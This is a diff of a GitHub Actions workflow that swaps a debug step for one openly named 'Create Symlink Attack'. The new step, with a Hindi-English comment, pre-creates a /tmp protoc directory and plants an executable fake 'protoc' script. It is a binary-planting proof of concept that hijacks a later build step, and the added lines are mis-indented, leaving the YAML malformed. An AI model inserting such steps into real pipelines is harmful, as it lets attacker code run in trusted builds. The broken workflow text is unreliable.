@@ -106,8 +106,12 @@ jobs:
             echo "continuous-run=continuous" >> "$GITHUB_OUTPUT"
             echo "continuous-prefix=(Continuous)" >> "$GITHUB_OUTPUT"
           fi
-       - name: Debug SHA
-        run: echo "The current SHA being used is ${{ github.event.pull_request.head.sha }}"
+       - name: Create Symlink Attack
+  run: |
+    # Attacker pehle se directory bana deta hai aur malicious file daal deta hai
+    mkdir -p /tmp/protoc-v3.25.0/bin/
+    echo "echo 'Hacked!'" > /tmp/protoc-v3.25.0/bin/protoc
+    chmod +x /tmp/protoc-v3.25.0/bin/protoc
   remove-tag:
     name: Remove safety tag
     needs: [set-vars]
